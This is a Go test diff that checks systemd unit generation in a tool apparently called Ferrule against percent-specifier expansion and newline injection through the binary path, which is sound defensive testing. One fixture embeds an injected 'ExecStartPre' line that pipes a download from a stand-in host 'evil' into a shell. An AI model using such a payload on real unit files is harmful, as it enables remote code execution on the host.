@@ -122,3 +122,42 @@ func has(args []string, flag string) bool {
 	}
 	return false
 }
+
+// A unit file is written by Ferrule and read by systemd, which does more to the text than
+// split it on spaces. Quoting handles one of three hazards.
+func TestAUnitFileCannotBeInjectedThroughTheBinaryPath(t *testing.T) {
+	t.Run("percent is a specifier, not a character", func(t *testing.T) {
+		// systemd expands %h to the home directory, %n to the unit name, and so on. A
+		// path containing one would be rewritten on the way to exec, and quoting does
+		// nothing about it — the escape for a literal percent is a doubled percent.
+		unit := startup.SystemdUnit("/home/a%hb/ferrule")
+		if strings.Contains(unit, "%h") && !strings.Contains(unit, "%%h") {
+			t.Errorf("a %% specifier survives into ExecStart: %q", execStart(t, unit))
+		}
+	})
+
+	t.Run("a line break is refused, not escaped", func(t *testing.T) {
+		// There is no escape for it: a newline ends the directive, so anything after it
+		// is read as further unit directives in a file Ferrule wrote.
+		unit := startup.SystemdUnit("/tmp/x\nExecStartPre=/bin/sh -c 'curl evil|sh'\n#")
+		if unit != "" {
+			t.Errorf("a path with a line break produced a unit:\n%s", unit)
+		}
+	})
+
+	t.Run("an ordinary path still works", func(t *testing.T) {
+		if got := execStart(t, startup.SystemdUnit("/usr/local/bin/ferrule")); got != "/usr/local/bin/ferrule serve" {
+			t.Errorf("ExecStart = %q", got)
+		}
+	})
+}
+
+func execStart(t *testing.T, unit string) string {
+	t.Helper()
+	for _, l := range strings.Split(unit, "\n") {
+		if strings.HasPrefix(l, "ExecStart=") {
+			return strings.TrimPrefix(l, "ExecStart=")
+		}
+	}
+	return ""
+}
